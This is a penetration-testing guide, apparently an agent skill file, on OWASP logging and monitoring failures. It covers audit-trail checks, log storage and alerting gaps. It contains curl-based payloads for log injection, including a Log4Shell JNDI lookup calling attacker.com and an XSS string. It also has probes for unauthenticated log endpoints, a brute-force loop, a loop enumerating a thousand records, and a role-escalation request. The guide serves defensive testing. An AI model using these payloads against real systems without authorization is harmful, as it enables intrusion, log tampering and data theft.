---
name: logging_monitoring_failures
description: Logging and monitoring failure testing covering missing audit trails, log injection, log storage security, and alerting gap analysis
---

# Logging and Monitoring Failures

OWASP A09 — Insufficient logging, detection, monitoring, and active response allows attackers to maintain persistence, tamper with data, and extract information while going undetected. Focus on verifying that security-relevant events are properly logged, logs are protected from tampering, and monitoring systems detect malicious activity.

## Attack Surface

**Application Logging**
- Authentication events (login, logout, password reset, MFA)
- Authorization failures (access denied, privilege escalation attempts)
- Data access events (sensitive record reads, exports, bulk operations)
- Administrative actions (user creation, role changes, configuration updates)
- Input validation failures (injection attempts, malformed requests)

**Infrastructure Logging**
- Web server access and error logs
- Database query logs and audit trails
- Network flow logs and firewall events
- Cloud service audit logs (CloudTrail, Azure Activity Log, GCP Audit Logs)
- Container and orchestration logs (Kubernetes audit, Docker logs)

**Log Infrastructure**
- Log aggregation systems (ELK, Splunk, Graylog, Loki)
- Log storage and retention policies
- Log access controls and integrity protection
- Log transmission security (encryption in transit)

**Alerting & Monitoring**
- Security event correlation and alerting
- Anomaly detection thresholds and rules
- Incident response integration
- Real-time monitoring dashboards

## Key Vulnerabilities

### Missing Audit Trails for Authentication Events

**What Must Be Logged**
```
Critical authentication events:
- Successful login (timestamp, user, source IP, user-agent)
- Failed login (timestamp, attempted user, source IP, reason)
- Account lockout (timestamp, user, source IP, lockout duration)
- Password reset request (timestamp, user, source IP)
- Password change (timestamp, user, source IP)
- MFA enrollment/verification (timestamp, user, method, success/failure)
- Session creation/destruction (timestamp, session ID, user)
- Token issuance/revocation (timestamp, user, token type)
```

**Testing Authentication Logging**
```bash
# Generate test events
# Successful login
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"correct"}'

# Failed login
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"wrong"}'

# Password reset
curl -X POST https://target.com/api/password-reset \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com"}'

# Check if these events appear in logs
# Look for log endpoints or exposed log files
curl -s https://target.com/logs
curl -s https://target.com/admin/logs
curl -s https://target.com/api/audit-log

# Check for logging in error responses
# If failed login returns same error for invalid user vs wrong password,
# logging may be the only way to detect brute force
```

### Insufficient Logging of Security-Relevant Actions

**Test Coverage Matrix**
```bash
# For each endpoint, verify logging exists for:
# 1. Who performed the action (authenticated user, IP)
# 2. What action was performed (endpoint, method, parameters)
# 3. When it occurred (timestamp with timezone)
# 4. What was the result (success, failure, error code)
# 5. What was affected (resource ID, record count)

# Administrative actions to test:
# User management: create, update, delete, role change
# System configuration: settings change, feature toggle
# Data management: export, bulk delete, archive

# Sensitive data access to test:
# PII access: customer records, personal data
# Financial data: transactions, payment info
# Health data: medical records

# API endpoint logging verification
# Send requests and check if they appear in audit logs
for endpoint in /api/users /api/admin /api/export /api/config; do
  curl -s -X GET "https://target.com$endpoint" \
    -H "Authorization: Bearer $TOKEN" \
    -o /dev/null
  # Check logs for this request
done
```

### Log Injection

**Testing Log Injection Vectors**
```bash
# CRLF injection in log files
# Inject newlines to create fake log entries
curl -X POST https://target.com/api/login \
  -d "username=admin%0d%0a[INFO] Login successful for admin"

# JSON log injection
curl -X POST https://target.com/api/login \
  -d 'username=admin","level":"INFO","message":"Login successful'

# Log4Shell-style format string injection (if using Log4j)
curl -X POST https://target.com/api/login \
  -d "username=\${jndi:ldap://attacker.com/callback}"

# XSS in log viewer (if logs displayed in web UI)
curl -X POST https://target.com/api/login \
  -d "username=<script>alert(1)</script>"

# ANSI escape sequence injection
curl -X POST https://target.com/api/login \
  -d "username=admin\x1b[2J\x1b[H"

# Null byte injection
curl -X POST https://target.com/api/login \
  -d "username=admin%00rest-of-fake-log-line"
```

**Log Format Exploitation**
```bash
# Apache/Nginx log injection via User-Agent
curl -H "User-Agent: Mozilla/5.0\r\nX-Injected: true" https://target.com/

# Referer header injection
curl -H "Referer: https://evil.com/$(python3 -c 'print("A"*10000)')" https://target.com/

# Request smuggling to manipulate log entries
# Inject partial requests that get logged as complete entries
```

### Log Storage Security

**Testing Log Access Controls**
```bash
# Check for exposed log files
curl -s https://target.com/logs/
curl -s https://target.com/error.log
curl -s https://target.com/access.log
curl -s https://target.com/debug.log
curl -s https://target.com/app.log

# Common log file locations
/.log /logs/ /var/log/ /tmp/logs/
/app.log /application.log /error.log /debug.log
/.logs /log.txt /audit.log

# Check for log aggregation endpoints without auth
curl -s https://target.com:9200/_cat/indices  # Elasticsearch
curl -s https://target.com:9200/_search  # Elasticsearch search

# Splunk without auth
curl -s https://target.com:8089/services/search/jobs

# Grafana without auth
curl -s https://target.com:3000/api/dashboards

# Loki without auth
curl -s https://target.com:3100/loki/api/v1/query
```

**Log Retention and Integrity**
```bash
# Check log rotation configuration
cat /etc/logrotate.d/app

# Verify log integrity mechanisms
# Are logs signed? Hash-chained? Stored in append-only storage?
# Is there tamper detection?

# Check for centralized logging
# If logs are only local, attacker with access can delete them
grep -r "syslog\|rsyslog\|fluentd\|logstash\|vector" /etc/

# Verify log backup and archival
# Logs should be backed up to write-once storage
```

### Alerting Gap Analysis

**Events That Should Trigger Alerts**
```
Critical alerts (immediate response):
- Multiple failed logins from same IP (brute force)
- Login from new device/location
- Privilege escalation attempt
- Mass data export or download
- Admin account creation or modification
- API key generation or rotation
- Security setting changes

High-priority alerts (within hours):
- Unusual access patterns (off-hours, unusual volume)
- Access to sensitive data outside normal workflow
- Failed authorization attempts
- Configuration changes
- Service account misuse

Medium-priority alerts (daily review):
- Successful logins from new IPs
- Password reset requests
- Unusual user-agent strings
- Geographic anomalies
```

**Testing Alert Generation**
```bash
# Brute force simulation (in controlled environment)
for i in $(seq 1 100); do
  curl -s -X POST https://target.com/api/login \
    -d "username=admin&password=wrong$i" &
done
wait
# Should trigger account lockout and alert

# Unusual access pattern
# Access sensitive endpoints at unusual times
# Access large volumes of records
for id in $(seq 1 1000); do
  curl -s https://target.com/api/users/$id &
done
wait

# Privilege escalation attempt
curl -s -X PUT https://target.com/api/users/self \
  -d '{"role":"admin"}'
```

## Testing Methodology

1. **Inventory logging endpoints** — Identify where logs are generated, stored, and displayed
2. **Authentication event coverage** — Verify logging for all auth events (login, logout, reset, MFA)
3. **Authorization event coverage** — Verify logging for access denied and privilege changes
4. **Sensitive action coverage** — Verify logging for data access, exports, admin actions
5. **Log injection testing** — Test CRLF, JSON, format string, and XSS injection in logs
6. **Log access control** — Verify logs are protected from unauthorized access and tampering
7. **Log transmission security** — Check encryption and integrity of log shipping
8. **Retention policy review** — Verify logs are retained for compliance-required periods
9. **Alerting coverage** — Map security events to alerts and identify gaps
10. **Incident response integration** — Verify alerts reach appropriate personnel

## Validation

1. Demonstrate missing audit trail for critical security event (e.g., failed login not logged)
2. Show log injection creating fake entries or corrupting log format
3. Prove logs accessible without authentication or proper authorization
4. Identify security event that should trigger alert but does not
5. Show logs stored without integrity protection (tamperable)

## Remediation

- Log all authentication, authorization, and administrative events
- Use structured logging (JSON) with consistent field names
- Sanitize all user input before logging to prevent injection
- Implement log integrity protection (hash chains, digital signatures, WORM storage)
- Encrypt logs in transit and at rest
- Implement centralized logging with appropriate access controls
- Set up alerts for critical security events with defined response procedures
- Establish log retention policies meeting compliance requirements (SOX, HIPAA, PCI-DSS)
- Regular review of alerting rules and tuning to reduce false positives
- Implement anomaly detection for unusual access patterns

## Pro Tips

1. Test logging by correlating your actions with log output — if you can't find your test event, logging is broken
2. Check both application logs and infrastructure logs — coverage often differs
3. Log injection is often overlooked but critical for forensic integrity
4. Alert fatigue is as dangerous as no alerts — check for alert tuning and escalation
5. Many organizations log events but never review them — verify review processes exist
6. Cloud audit logs (CloudTrail, etc.) may have separate access controls from application logs
7. Log aggregation endpoints are high-value targets — compromising them allows evidence destruction

## Summary

Logging and monitoring failures create blind spots that attackers exploit to operate undetected. Every security-relevant event must be logged with sufficient detail for forensic analysis, logs must be protected from tampering and unauthorized access, and monitoring systems must detect and alert on malicious activity. The absence of logging is equivalent to operating without security cameras.
